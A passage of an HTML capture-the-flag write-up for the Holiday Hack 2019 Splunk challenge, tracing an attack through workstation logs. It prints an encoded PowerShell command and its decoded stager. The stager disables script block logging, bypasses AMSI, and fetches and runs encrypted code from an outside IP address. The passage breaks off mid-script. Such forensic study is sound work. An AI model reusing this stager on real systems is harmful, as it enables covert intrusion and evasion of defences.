<!DOCTYPE html5>
<html>
	<head>
		<title>splunk | Holiday Hack 2019</title>
		<link rel="stylesheet" href="/css/common.css">
		<link rel="stylesheet" href="/css/writeup.css">
		<link rel="stylesheet" href="/css/pygments.css">
		<link rel="stylesheet" href="https://unpkg.com/normalize.css@8.0.1/normalize.css">
		
		<meta charset="utf-8" />
	</head>
	<body>
		<main>
			<h1>Splunk</h1>
<p>Splunk is a log collection and analysis tool. You can look at all the events for your network and highlight weird ones. In this case, we're given some existing logs and told an attack is somewhere in there.</p>
<h1>Question 1</h1>
<blockquote>
<p>What is the short host name of Professor Banas' computer? </p>
</blockquote>
<p>We can search for <code>*</code>, all events, and look at the sidebar. If we click on <code>host</code> it'll show us all the values for this attribute - in this case all the different hosts that data was collected from - <code>sweetums</code>, <code>SWEETUMS</code> and <code>stoq.elfu.org</code>. To be thorough we can click on <code>stoq.elfu.org</code> to only show events from that host and see that none of them are from windows event logs, so it's safe to assume this isn't a workstation and we don't need to worry about it. So we know the professor's workstation is <code>sweetums</code>.</p>
<h1>Question 2</h1>
<blockquote>
<p>What is the name of the sensitive file that was likely accessed and copied by the attacker?</p>
</blockquote>
<p>Let's start by looking at all the events from the workstation with <code>host="sweetums"</code>. The first thing we see is an event from powershell, which was called with this command line invocation:</p>
<div class="codehilite"><pre><span></span><span class="err">powershell -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBlAHIAUwBpAG8ATgBUAGEAQgBMAGUALgBQAFMAVgBFAFIAcwBJAE8AbgAuAE0AQQBKAG8AcgAgAC0AZwBFACAAMwApAHsAJABHAFAARgA9AFsAUgBlAGYAXQAuAEEAUwBzAEUATQBCAGwAeQAuAEcARQBUAFQAeQBQAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAEUAdABGAGkARQBgAEwAZAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApADsASQBGACgAJABHAFAARgApAHsAJABHAFAAQwA9ACQARwBQAEYALgBHAGUAVABWAEEAbAB1AEUAKAAkAG4AVQBsAEwAKQA7AEkAZgAoACQARwBQAEMAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQApAHsAJABHAFAAQwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJABHAFAAQwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcAXQA9ADAAfQAkAHYAYQBsAD0AWwBDAE8ATABsAEUAYwBUAGkAbwBOAHMALgBHAEUAbgBlAFIAaQBDAC4ARABJAEMAVABJAG8ATgBBAHIAeQBbAFMAdAByAEkATgBHACwAUwB5AFMAVABFAG0ALgBPAGIAagBlAGMAVABdAF0AOgA6AE4AZQBXACgAKQA7ACQAdgBBAGwALgBBAGQARAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQAdgBhAEwALgBBAEQAZAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnACwAMAApADsAJABHAFAAQwBbACcASABLAEUAWQBfAEwATwBDAEEATABfAE0AQQBDAEgASQBOAEUAXABTAG8AZgB0AHcAYQByAGUAXABQAG8AbABpAGMAaQBlAHMAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABQAG8AdwBlAHIAUwBoAGUAbABsAFwAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAD0AJABWAEEAbAB9AEUAbABTAEUAewBbAFMAQwByAEkAUABUAEIAbABPAEMASwBdAC4AIgBHAEUAdABGAEkAZQBgAGwARAAiACgAJwBzAGkAZwBuAGEAdAB1AHIAZQBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApAC4AUwBFAFQAVgBBAEwAVQBlACgAJABOAFUAbABsACwAKABOAEUAVwAtAE8AQgBqAEUAYwB0ACAAQwBvAGwAbABFAGMAVABpAG8AbgBzAC4ARwBFAG4AZQByAEkAQwAuAEgAYQBzAGgAUwBlAFQAWwBzAFQAcgBJAE4ARwBdACkAKQB9AFsAUgBFAGYAXQAuAEEAUwBTAEUATQBCAGwAWQAuAEcARQBUAFQAWQBQAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpAFUAdABpAGwAcwAnACkAfAA/AHsAJABfAH0AfAAlAHsAJABfAC4ARwBFAFQARgBpAGUAbABEACgAJwBhAG0AcwBpAEkAbgBpAHQARgBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAdABWAGEAbABVAGUAKAAkAE4AVQBsAEwALAAkAFQAcgB1AGUAKQB9ADsAfQA7AFsAUwB5AFMAdABlAE0ALgBOAGUAVAAuAFMARQBSAHYAaQBjAEUAUABvAEkAbgBUAE0AYQBOAGEARwBlAHIAXQA6ADoARQBYAFAAZQBjAFQAMQAwADAAQwBPAE4AdABJAG4AVQBlAD0AMAA7ACQAdwBjAD0ATgBFAHcALQBPAGIAagBFAEMAVAAgAFMAeQBzAFQARQBNAC4ATgBlAFQALgBXAGUAQgBDAEwAaQBFAE4AVAA7ACQAdQA9ACcATQBvAHoAaQBsAGwAYQAvADUALgAwACAAKABXAGkAbgBkAG8AdwBzACAATgBUACAANgAuADEAOwAgAFcATwBXADYANAA7ACAAVAByAGkAZABlAG4AdAAvADcALgAwADsAIAByAHYAOgAxADEALgAwACkAIABsAGkAawBlACAARwBlAGMAawBvACcAOwAkAHcAQwAuAEgARQBBAEQARQByAFMALgBBAEQAZAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkAFcAYwAuAFAAcgBvAFgAeQA9AFsAUwB5AFMAVABlAE0ALgBOAGUAdAAuAFcAZQBCAFIARQBRAHUARQBTAFQAXQA6ADoARABFAEYAYQBVAEwAVABXAGUAYgBQAHIAbwBYAHkAOwAkAFcAQwAuAFAAUgBvAFgAeQAuAEMAUgBFAEQAZQBuAFQASQBBAGwAcwAgAD0AIABbAFMAeQBTAFQARQBtAC4ATgBFAFQALgBDAFIAZQBkAGUATgBUAGkAQQBsAEMAQQBjAEgAZQBdADoAOgBEAGUARgBhAHUAbABUAE4AZQBUAHcATwBSAGsAQwBSAEUARABlAG4AVABpAEEATABTADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkAHcAYwAuAFAAcgBvAHgAeQA7ACQASwA9AFsAUwB5AFMAVABFAE0ALgBUAGUAeAB0AC4ARQBuAGMATwBkAEkATgBHAF0AOgA6AEEAUwBDAEkASQAuAEcAZQBUAEIAWQB0AGUAUwAoACcAegBkACEAUABtAHcAMwBKAC8AcQBuAHUAVwBvAEgAWAB+AD0AZwAuAHsAPgBwACwARwBFAF0AOgB8ACMATQBSACcAKQA7ACQAUgA9AHsAJABEACwAJABLAD0AJABBAFIARwBzADsAJABTAD0AMAAuAC4AMgA1ADUAOwAwAC4ALgAyADUANQB8ACUAewAkAEoAPQAoACQASgArACQAUwBbACQAXwBdACsAJABLAFsAJABfACUAJABLAC4AQwBPAFUAbgB0AF0AKQAlADIANQA2ADsAJABTAFsAJABfAF0ALAAkAFMAWwAkAEoAXQA9ACQAUwBbACQASgBdACwAJABTAFsAJABfAF0AfQA7ACQARAB8ACUAewAkAEkAPQAoACQASQArADEAKQAlADIANQA2ADsAJABIAD0AKAAkAEgAKwAkAFMAWwAkAEkAXQApACUAMgA1ADYAOwAkAFMAWwAkAEkAXQAsACQAUwBbACQASABdAD0AJABTAFsAJABIAF0ALAAkAFMAWwAkAEkAXQA7ACQAXwAtAEIAWABvAFIAJABTAFsAKAAkAFMAWwAkAEkAXQArACQAUwBbACQASABdACkAJQAyADUANgBdAH0AfQA7ACQAcwBlAHIAPQAnAGgAdAB0AHAAOgAvAC8AMQA0ADQALgAyADAAMgAuADQANgAuADIAMQA0ADoAOAAwADgAMAAnADsAJAB0AD0AJwAvAGEAZABtAGkAbgAvAGcAZQB0AC4AcABoAHAAJwA7ACQAVwBDAC4ASABFAEEARABFAHIAcwAuAEEAZABkACgAIgBDAG8AbwBrAGkAZQAiACwAIgBzAGUAcwBzAGkAbwBuAD0AcgBlAFQAOQBYAFEAQQBsADAARQBNAEoAbgB4AHUAawBFAFoAeQAvADcATQBTADcAMABYADQAPQAiACkAOwAkAEQAQQBUAGEAPQAkAFcAQwAuAEQAbwB3AG4AbABPAEEARABEAEEAdABBACgAJABzAEUAcgArACQAVAApADsAJABJAHYAPQAkAEQAYQB0AEEAWwAwAC4ALgAzAF0AOwAkAEQAYQB0AEEAPQAkAGQAQQBUAGEAWwA0AC4ALgAkAEQAYQB0AEEALgBsAEUATgBHAHQASABdADsALQBKAE8ASQBOAFsAQwBoAGEAUgBbAF0AXQAoACYAIAAkAFIAIAAkAEQAYQB0AEEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA==</span>
</pre></div>


<p><code>-enc</code> is used to pass encoded scripts, so we know the big string in our command line is just base64 encoded. If we <a href="(https://gchq.github.io/CyberChef/#recipe=From_Base64(" title="A-Za-z0-9%2B/%3D',true)Decode_text('OEM%20United%20States%20(437)">put it into cyberchef and experiment with the character encoding</a>Encode_text('UTF-8%20(65001)'/disabled)&amp;input=U1FCR0FDZ0FKQUJRQUZNQVZnQmxBSElBVXdCcEFHOEFUZ0JVQUdFQVFnQk1BR1VBTGdCUUFGTUFWZ0JGQUZJQWN3QkpBRThBYmdBdUFFMEFRUUJLQUc4QWNnQWdBQzBBWndCRkFDQUFNd0FwQUhzQUpBQkhBRkFBUmdBOUFGc0FVZ0JsQUdZQVhRQXVBRUVBVXdCekFFVUFUUUJDQUd3QWVRQXVBRWNBUlFCVUFGUUFlUUJRQUVVQUtBQW5BRk1BZVFCekFIUUFaUUJ0QUM0QVRRQmhBRzRBWVFCbkFHVUFiUUJsQUc0QWRBQXVBRUVBZFFCMEFHOEFiUUJoQUhRQWFRQnZBRzRBTGdCVkFIUUFhUUJzQUhNQUp3QXBBQzRBSWdCSEFFVUFkQUJHQUdrQVJRQmdBRXdBWkFBaUFDZ0FKd0JqQUdFQVl3Qm9BR1VBWkFCSEFISUFid0IxQUhBQVVBQnZBR3dBYVFCakFIa0FVd0JsQUhRQWRBQnBBRzRBWndCekFDY0FMQUFuQUU0QUp3QXJBQ2NBYndCdUFGQUFkUUJpQUd3QWFRQmpBQ3dBVXdCMEFHRUFkQUJwQUdNQUp3QXBBRHNBU1FCR0FDZ0FKQUJIQUZBQVJnQXBBSHNBSkFCSEFGQUFRd0E5QUNRQVJ3QlFBRVlBTGdCSEFHVUFWQUJXQUVFQWJBQjFBRVVBS0FBa0FHNEFWUUJzQUV3QUtRQTdBRWtBWmdBb0FDUUFSd0JRQUVNQVd3QW5BRk1BWXdCeUFHa0FjQUIwQUVJQUp3QXJBQ2NBYkFCdkFHTUFhd0JNQUc4QVp3Qm5BR2tBYmdCbkFDY0FYUUFwQUhzQUpBQkhBRkFBUXdCYkFDY0FVd0JqQUhJQWFRQndBSFFBUWdBbkFDc0FKd0JzQUc4QVl3QnJBRXdBYndCbkFHY0FhUUJ1QUdjQUp3QmRBRnNBSndCRkFHNEFZUUJpQUd3QVpRQlRBR01BY2dCcEFIQUFkQUJDQUNjQUt3QW5BR3dBYndCakFHc0FUQUJ2QUdjQVp3QnBBRzRBWndBbkFGMEFQUUF3QURzQUpBQkhBRkFBUXdCYkFDY0FVd0JqQUhJQWFRQndBSFFBUWdBbkFDc0FKd0JzQUc4QVl3QnJBRXdBYndCbkFHY0FhUUJ1QUdjQUp3QmRBRnNBSndCRkFHNEFZUUJpQUd3QVpRQlRBR01BY2dCcEFIQUFkQUJDQUd3QWJ3QmpBR3NBU1FCdUFIWUFid0JqQUdFQWRBQnBBRzhBYmdCTUFHOEFad0JuQUdrQWJnQm5BQ2NBWFFBOUFEQUFmUUFrQUhZQVlRQnNBRDBBV3dCREFFOEFUQUJzQUVVQVl3QlVBR2tBYndCT0FITUFMZ0JIQUVVQWJnQmxBRklBYVFCREFDNEFSQUJKQUVNQVZBQkpBRzhBVGdCQkFISUFlUUJiQUZNQWRBQnlBRWtBVGdCSEFDd0FVd0I1QUZNQVZBQkZBRzBBTGdCUEFHSUFhZ0JsQUdNQVZBQmRBRjBBT2dBNkFFNEFaUUJYQUNnQUtRQTdBQ1FBZGdCQkFHd0FMZ0JCQUdRQVJBQW9BQ2NBUlFCdUFHRUFZZ0JzQUdVQVV3QmpBSElBYVFCd0FIUUFRZ0FuQUNzQUp3QnNBRzhBWXdCckFFd0Fid0JuQUdjQWFRQnVBR2NBSndBc0FEQUFLUUE3QUNRQWRnQmhBRXdBTGdCQkFFUUFaQUFvQUNjQVJRQnVBR0VBWWdCc0FHVUFVd0JqQUhJQWFRQndBSFFBUWdCc0FHOEFZd0JyQUVrQWJnQjJBRzhBWXdCaEFIUUFhUUJ2QUc0QVRBQnZBR2NBWndCcEFHNEFad0FuQUN3QU1BQXBBRHNBSkFCSEFGQUFRd0JiQUNjQVNBQkxBRVVBV1FCZkFFd0FUd0JEQUVFQVRBQmZBRTBBUVFCREFFZ0FTUUJPQUVVQVhBQlRBRzhBWmdCMEFIY0FZUUJ5QUdVQVhBQlFBRzhBYkFCcEFHTUFhUUJsQUhNQVhBQk5BR2tBWXdCeUFHOEFjd0J2QUdZQWRBQmNBRmNBYVFCdUFHUUFid0IzQUhNQVhBQlFBRzhBZHdCbEFISUFVd0JvQUdVQWJBQnNBRndBVXdCakFISUFhUUJ3QUhRQVFnQW5BQ3NBSndCc0FHOEFZd0JyQUV3QWJ3Qm5BR2NBYVFCdUFHY0FKd0JkQUQwQUpBQldBRUVBYkFCOUFFVUFiQUJUQUVVQWV3QmJBRk1BUXdCeUFFa0FVQUJVQUVJQWJBQlBBRU1BU3dCZEFDNEFJZ0JIQUVVQWRBQkdBRWtBWlFCZ0FHd0FSQUFpQUNnQUp3QnpBR2tBWndCdUFHRUFkQUIxQUhJQVpRQnpBQ2NBTEFBbkFFNEFKd0FyQUNjQWJ3QnVBRkFBZFFCaUFHd0FhUUJqQUN3QVV3QjBBR0VBZEFCcEFHTUFKd0FwQUM0QVV3QkZBRlFBVmdCQkFFd0FWUUJsQUNnQUpBQk9BRlVBYkFCc0FDd0FLQUJPQUVVQVZ3QXRBRThBUWdCcUFFVUFZd0IwQUNBQVF3QnZBR3dBYkFCRkFHTUFWQUJwQUc4QWJnQnpBQzRBUndCRkFHNEFaUUJ5QUVrQVF3QXVBRWdBWVFCekFHZ0FVd0JsQUZRQVd3QnpBRlFBY2dCSkFFNEFSd0JkQUNrQUtRQjlBRnNBVWdCRkFHWUFYUUF1QUVFQVV3QlRBRVVBVFFCQ0FHd0FXUUF1QUVjQVJRQlVBRlFBV1FCUUFHVUFLQUFuQUZNQWVRQnpBSFFBWlFCdEFDNEFUUUJoQUc0QVlRQm5BR1VBYlFCbEFHNEFkQUF1QUVFQWRRQjBBRzhBYlFCaEFIUUFhUUJ2QUc0QUxnQkJBRzBBY3dCcEFGVUFkQUJwQUd3QWN3QW5BQ2tBZkFBL0FIc0FKQUJmQUgwQWZBQWxBSHNBSkFCZkFDNEFSd0JGQUZRQVJnQnBBR1VBYkFCRUFDZ0FKd0JoQUcwQWN3QnBBRWtBYmdCcEFIUUFSZ0JoQUdrQWJBQmxBR1FBSndBc0FDY0FUZ0J2QUc0QVVBQjFBR0lBYkFCcEFHTUFMQUJUQUhRQVlRQjBBR2tBWXdBbkFDa0FMZ0JUQUVVQWRBQldBR0VBYkFCVkFHVUFLQUFrQUU0QVZRQnNBRXdBTEFBa0FGUUFjZ0IxQUdVQUtRQjlBRHNBZlFBN0FGc0FVd0I1QUZNQWRBQmxBRTBBTGdCT0FHVUFWQUF1QUZNQVJRQlNBSFlBYVFCakFFVUFVQUJ2QUVrQWJnQlVBRTBBWVFCT0FHRUFSd0JsQUhJQVhRQTZBRG9BUlFCWUFGQUFaUUJqQUZRQU1RQXdBREFBUXdCUEFFNEFkQUJKQUc0QVZRQmxBRDBBTUFBN0FDUUFkd0JqQUQwQVRnQkZBSGNBTFFCUEFHSUFhZ0JGQUVNQVZBQWdBRk1BZVFCekFGUUFSUUJOQUM0QVRnQmxBRlFBTGdCWEFHVUFRZ0JEQUV3QWFRQkZBRTRBVkFBN0FDUUFkUUE5QUNjQVRRQnZBSG9BYVFCc0FHd0FZUUF2QURVQUxnQXdBQ0FBS0FCWEFHa0FiZ0JrQUc4QWR3QnpBQ0FBVGdCVUFDQUFOZ0F1QURFQU93QWdBRmNBVHdCWEFEWUFOQUE3QUNBQVZBQnlBR2tBWkFCbEFHNEFkQUF2QURjQUxnQXdBRHNBSUFCeUFIWUFPZ0F4QURFQUxnQXdBQ2tBSUFCc0FHa0Fhd0JsQUNBQVJ3QmxBR01BYXdCdkFDY0FPd0FrQUhjQVF3QXVBRWdBUlFCQkFFUUFSUUJ5QUZNQUxnQkJBRVFBWkFBb0FDY0FWUUJ6QUdVQWNnQXRBRUVBWndCbEFHNEFkQUFuQUN3QUpBQjFBQ2tBT3dBa0FGY0FZd0F1QUZBQWNnQnZBRmdBZVFBOUFGc0FVd0I1QUZNQVZBQmxBRTBBTGdCT0FHVUFkQUF1QUZjQVpRQkNBRklBUlFCUkFIVUFSUUJUQUZRQVhRQTZBRG9BUkFCRkFFWUFZUUJWQUV3QVZBQlhBR1VBWWdCUUFISUFid0JZQUhrQU93QWtBRmNBUXdBdUFGQUFVZ0J2QUZnQWVRQXVBRU1BVWdCRkFFUUFaUUJ1QUZRQVNRQkJBR3dBY3dBZ0FEMEFJQUJiQUZNQWVRQlRBRlFBUlFCdEFDNEFUZ0JGQUZRQUxnQkRBRklBWlFCa0FHVUFUZ0JVQUdrQVFRQnNBRU1BUVFCakFFZ0FaUUJkQURvQU9nQkVBR1VBUmdCaEFIVUFiQUJVQUU0QVpRQlVBSGNBVHdCU0FHc0FRd0JTQUVVQVJBQmxBRzRBVkFCcEFFRUFUQUJUQURzQUpBQlRBR01BY2dCcEFIQUFkQUE2QUZBQWNnQnZBSGdBZVFBZ0FEMEFJQUFrQUhjQVl3QXVBRkFBY2dCdkFIZ0FlUUE3QUNRQVN3QTlBRnNBVXdCNUFGTUFWQUJGQUUwQUxnQlVBR1VBZUFCMEFDNEFSUUJ1QUdNQVR3QmtBRWtBVGdCSEFGMEFPZ0E2QUVFQVV3QkRBRWtBU1FBdUFFY0FaUUJVQUVJQVdRQjBBR1VBVXdBb0FDY0FlZ0JrQUNFQVVBQnRBSGNBTXdCS0FDOEFjUUJ1QUhVQVZ3QnZBRWdBV0FCK0FEMEFad0F1QUhzQVBnQndBQ3dBUndCRkFGMEFPZ0I4QUNNQVRRQlNBQ2NBS1FBN0FDUUFVZ0E5QUhzQUpBQkVBQ3dBSkFCTEFEMEFKQUJCQUZJQVJ3QnpBRHNBSkFCVEFEMEFNQUF1QUM0QU1nQTFBRFVBT3dBd0FDNEFMZ0F5QURVQU5RQjhBQ1VBZXdBa0FFb0FQUUFvQUNRQVNnQXJBQ1FBVXdCYkFDUUFYd0JkQUNzQUpBQkxBRnNBSkFCZkFDVUFKQUJMQUM0QVF3QlBBRlVBYmdCMEFGMEFLUUFsQURJQU5RQTJBRHNBSkFCVEFGc0FKQUJmQUYwQUxBQWtBRk1BV3dBa0FFb0FYUUE5QUNRQVV3QmJBQ1FBU2dCZEFDd0FKQUJUQUZzQUpBQmZBRjBBZlFBN0FDUUFSQUI4QUNVQWV3QWtBRWtBUFFBb0FDUUFTUUFyQURFQUtRQWxBRElBTlFBMkFEc0FKQUJJQUQwQUtBQWtBRWdBS3dBa0FGTUFXd0FrQUVrQVhRQXBBQ1VBTWdBMUFEWUFPd0FrQUZNQVd3QWtBRWtBWFFBc0FDUUFVd0JiQUNRQVNBQmRBRDBBSkFCVEFGc0FKQUJJQUYwQUxBQWtBRk1BV3dBa0FFa0FYUUE3QUNRQVh3QXRBRUlBV0FCdkFGSUFKQUJUQUZzQUtBQWtBRk1BV3dBa0FFa0FYUUFyQUNRQVV3QmJBQ1FBU0FCZEFDa0FKUUF5QURVQU5nQmRBSDBBZlFBN0FDUUFjd0JsQUhJQVBRQW5BR2dBZEFCMEFIQUFPZ0F2QUM4QU1RQTBBRFFBTGdBeUFEQUFNZ0F1QURRQU5nQXVBRElBTVFBMEFEb0FPQUF3QURnQU1BQW5BRHNBSkFCMEFEMEFKd0F2QUdFQVpBQnRBR2tBYmdBdkFHY0FaUUIwQUM0QWNBQm9BSEFBSndBN0FDUUFWd0JEQUM0QVNBQkZBRUVBUkFCRkFISUFjd0F1QUVFQVpBQmtBQ2dBSWdCREFHOEFid0JyQUdrQVpRQWlBQ3dBSWdCekFHVUFjd0J6QUdrQWJ3QnVBRDBBY2dCbEFGUUFPUUJZQUZFQVFRQnNBREFBUlFCTkFFb0FiZ0I0QUhVQWF3QkZBRm9BZVFBdkFEY0FUUUJUQURjQU1BQllBRFFBUFFBaUFDa0FPd0FrQUVRQVFRQlVBR0VBUFFBa0FGY0FRd0F1QUVRQWJ3QjNBRzRBYkFCUEFFRUFSQUJFQUVFQWRBQkJBQ2dBSkFCekFFVUFjZ0FyQUNRQVZBQXBBRHNBSkFCSkFIWUFQUUFrQUVRQVlRQjBBRUVBV3dBd0FDNEFMZ0F6QUYwQU93QWtBRVFBWVFCMEFFRUFQUUFrQUdRQVFRQlVBR0VBV3dBMEFDNEFMZ0FrQUVRQVlRQjBBRUVBTGdCc0FFVUFUZ0JIQUhRQVNBQmRBRHNBTFFCS0FFOEFTUUJPQUZzQVF3Qm9BR0VBVWdCYkFGMEFYUUFvQUNZQUlBQWtBRklBSUFBa0FFUUFZUUIwQUVFQUlBQW9BQ1FBU1FCV0FDc0FKQUJMQUNrQUtRQjhBRWtBUlFCWUFBPT0)) we eventually get this powershell script:</p>
<div class="codehilite"><pre><span></span><span class="k">if</span><span class="p">(</span><span class="nv">$PSVerSioNTaBLe</span><span class="p">.</span><span class="n">PSVERsIOn</span><span class="p">.</span><span class="n">MAJor</span> <span class="o">-gE</span> <span class="n">3</span><span class="p">){</span>
    <span class="nv">$GPF</span><span class="p">=</span><span class="no">[Ref]</span><span class="p">.</span><span class="n">ASsEMBly</span><span class="p">.</span><span class="n">GETTyPE</span><span class="p">(</span><span class="s1">&#39;System.Management.Automation.Utils&#39;</span><span class="p">).</span><span class="s2">&quot;GEtFiE`Ld&quot;</span><span class="p">(</span><span class="s1">&#39;cachedGroupPolicySettings&#39;</span><span class="p">,</span><span class="s1">&#39;N&#39;</span><span class="p">+</span><span class="s1">&#39;onPublic,Static&#39;</span><span class="p">);</span>
    <span class="k">IF</span><span class="p">(</span><span class="nv">$GPF</span><span class="p">){</span>
        <span class="nv">$GPC</span><span class="p">=</span><span class="nv">$GPF</span><span class="p">.</span><span class="n">GeTVAluE</span><span class="p">(</span><span class="nv">$nUlL</span><span class="p">);</span>
        <span class="k">If</span><span class="p">(</span><span class="nv">$GPC</span><span class="p">[</span><span class="s1">&#39;ScriptB&#39;</span><span class="p">+</span><span class="s1">&#39;lockLogging&#39;</span><span class="p">]){</span>
            <span class="nv">$GPC</span><span class="p">[</span><span class="s1">&#39;ScriptB&#39;</span><span class="p">+</span><span class="s1">&#39;lockLogging&#39;</span><span class="p">][</span><span class="s1">&#39;EnableScriptB&#39;</span><span class="p">+</span><span class="s1">&#39;lockLogging&#39;</span><span class="p">]=</span><span class="n">0</span><span class="p">;</span>
            <span class="nv">$GPC</span><span class="p">[</span><span class="s1">&#39;ScriptB&#39;</span><span class="p">+</span><span class="s1">&#39;lockLogging&#39;</span><span class="p">][</span><span class="s1">&#39;EnableScriptBlockInvocationLogging&#39;</span><span class="p">]=</span><span class="n">0</span>
        <span class="p">}</span>
        <span class="nv">$val</span><span class="p">=</span><span class="no">[COLlEcTioNs.GEneRiC.DICTIoNAry[StrING,SySTEm.ObjecT]]</span><span class="p">::</span><span class="n">NeW</span><span class="p">();</span>
        <span class="nv">$vAl</span><span class="p">.</span><span class="n">AdD</span><span class="p">(</span><span class="s1">&#39;EnableScriptB&#39;</span><span class="p">+</span><span class="s1">&#39;lockLogging&#39;</span><span class="p">,</span><span class="n">0</span><span class="p">);</span>
        <span class="nv">$vaL</span><span class="p">.</span><span class="n">ADd</span><span class="p">(</span><span class="s1">&#39;EnableScriptBlockInvocationLogging&#39;</span><span class="p">,</span><span class="n">0</span><span class="p">);</span>
        <span class="nv">$GPC</span><span class="p">[</span><span class="s1">&#39;HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptB&#39;</span><span class="p">+</span><span class="s1">&#39;lockLogging&#39;</span><span class="p">]=</span><span class="nv">$VAl</span>
    <span class="p">}</span><span class="k">ElSE</span><span class="p">{</span>
        <span class="no">[SCrIPTBlOCK]</span><span class="p">.</span><span class="s2">&quot;GEtFIe`lD&quot;</span><span class="p">(</span><span class="s1">&#39;signatures&#39;</span><span class="p">,</span><span class="s1">&#39;N&#39;</span><span class="p">+</span><span class="s1">&#39;onPublic,Static&#39;</span><span class="p">).</span><span class="n">SETVALUe</span><span class="p">(</span><span class="nv">$NUll</span><span class="p">,(</span><span class="nb">NEW-OBjEct</span> <span class="n">CollEcTions</span><span class="p">.</span><span class="n">GEnerIC</span><span class="p">.</span><span class="n">HashSeT</span><span class="no">[sTrING]</span><span class="p">))</span>
    <span class="p">}</span>
    <span class="no">[REf]</span><span class="p">.</span><span class="n">ASSEMBlY</span><span class="p">.</span><span class="n">GETTYPe</span><span class="p">(</span><span class="s1">&#39;System.Management.Automation.AmsiUtils&#39;</span><span class="p">)|?{</span><span class="nv">$_</span><span class="p">}|%{</span><span class="nv">$_</span><span class="p">.</span><span class="n">GETFielD</span><span class="p">(</span><span class="s1">&#39;amsiInitFailed&#39;</span><span class="p">,</span><span class="s1">&#39;NonPublic,Static&#39;</span><span class="p">).</span><span class="n">SEtValUe</span><span class="p">(</span><span class="nv">$NUlL</span><span class="p">,</span><span class="nv">$True</span><span class="p">)};</span>
    <span class="p">};</span>
<span class="no">[SySteM.NeT.SERvicEPoInTMaNaGer]</span><span class="p">::</span><span class="n">EXPecT100CONtInUe</span><span class="p">=</span><span class="n">0</span><span class="p">;</span>
<span class="nv">$wc</span><span class="p">=</span><span class="nb">NEw-ObjECT</span> <span class="n">SysTEM</span><span class="p">.</span><span class="n">NeT</span><span class="p">.</span><span class="n">WeBCLiENT</span><span class="p">;</span>
<span class="nv">$u</span><span class="p">=</span><span class="s1">&#39;Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko&#39;</span><span class="p">;</span>
<span class="nv">$wC</span><span class="p">.</span><span class="n">HEADErS</span><span class="p">.</span><span class="n">ADd</span><span class="p">(</span><span class="s1">&#39;User-Agent&#39;</span><span class="p">,</span><span class="nv">$u</span><span class="p">);</span>
<span class="nv">$Wc</span><span class="p">.</span><span class="n">ProXy</span><span class="p">=</span><span class="no">[SySTeM.Net.WeBREQuEST]</span><span class="p">::</span><span class="n">DEFaULTWebProXy</span><span class="p">;</span>
<span class="nv">$WC</span><span class="p">.</span><span class="n">PRoXy</span><span class="p">.</span><span class="n">CREDenTIAls</span> <span class="p">=</span> <span class="no">[SySTEm.NET.CRedeNTiAlCAcHe]</span><span class="p">::</span><span class="n">DeFaulTNeTwORkCREDenTiALS</span><span class="p">;</span>
<span class="nv">$Script:Proxy</span> <span class="p">=</span> <span class="nv">$wc</span><span class="p">.</span><span class="n">Proxy</span><span class="p">;</span>
<span class="nv">$K</span><span class="p">=</span><span class="no">[SySTEM.Text.EncOdING]</span><span class="p">::</span><span class="n">ASCII</span><span class="p">.</span><span class="n">GeTBYteS</span><span class="p">(</span><span class="s1">&#39;zd!Pmw3J/qnuWoHX~=g.{&gt;p,GE]:|#MR&#39;</span><span class="p">);</span><span class="nv">$R</span><span class="p">={</span><span class="nv">$D</span><span class="p">,</span><span class="nv">$K</span><span class="p">=</span><span class="nv">$ARGs</span><span class="p">;</span><span class="nv">$S</span><span class="p">=</span><span class="n">0</span><span class="p">..</span><span class="n">255</span><span class="p">;</span><span class="n">0</span><span class="p">..</span><span class="n">255</span><span class="p">|%{</span><span class="nv">$J</span><span class="p">=(</span><span class="nv">$J</span><span class="p">+</span><span class="nv">$S</span><span class="p">[</span><span class="nv">$_</span><span class="p">]+</span><span class="nv">$K</span><span class="p">[</span><span class="nv">$_</span><span class="p">%</span><span class="nv">$K</span><span class="p">.</span><span class="n">COUnt</span><span class="p">])</span><span class="k">%</span><span class="n">256</span><span 